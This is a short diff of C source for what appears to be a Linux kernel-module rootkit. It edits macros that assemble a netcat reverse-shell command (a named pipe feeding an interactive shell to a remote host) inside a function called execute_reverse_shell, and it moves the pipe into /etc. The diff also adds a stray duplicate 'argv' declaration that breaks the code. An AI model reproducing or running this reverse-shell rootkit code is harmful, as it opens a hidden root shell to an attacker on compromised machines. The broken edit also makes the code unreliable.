@@ -5,8 +5,8 @@
 #define HOME "HOME=/root"
 #define TERM "TERM=xterm"
 #define SHELL "/bin/bash"
-#define EXEC_P1 "/bin/rm /tmp/fifo;/usr/bin/mkfifo /tmp/fifo;/bin/cat /tmp/fifo|/bin/sh -i 2>&1|/bin/nc "
-#define EXEC_P2 " >/tmp/umbra/fifo"
+#define EXEC_P1 "/bin/rm /etc/fifo;/usr/bin/mkfifo /etc/fifo;/bin/cat /etc/fifo|/bin/sh -i 2>&1 | /usr/bin/nc "
+#define EXEC_P2 " >/etc/fifo"
 				
 
 
@@ -25,7 +25,7 @@ void execute_reverse_shell(struct work_struct *work){
     
     char *exec = kmalloc(sizeof(char)*256, GFP_KERNEL);
     memset(exec, 0, sizeof(char) * 256);
-    
+    char *argv[] = {}
     char *argv[] = {
                         SHELL,
                         "-c",
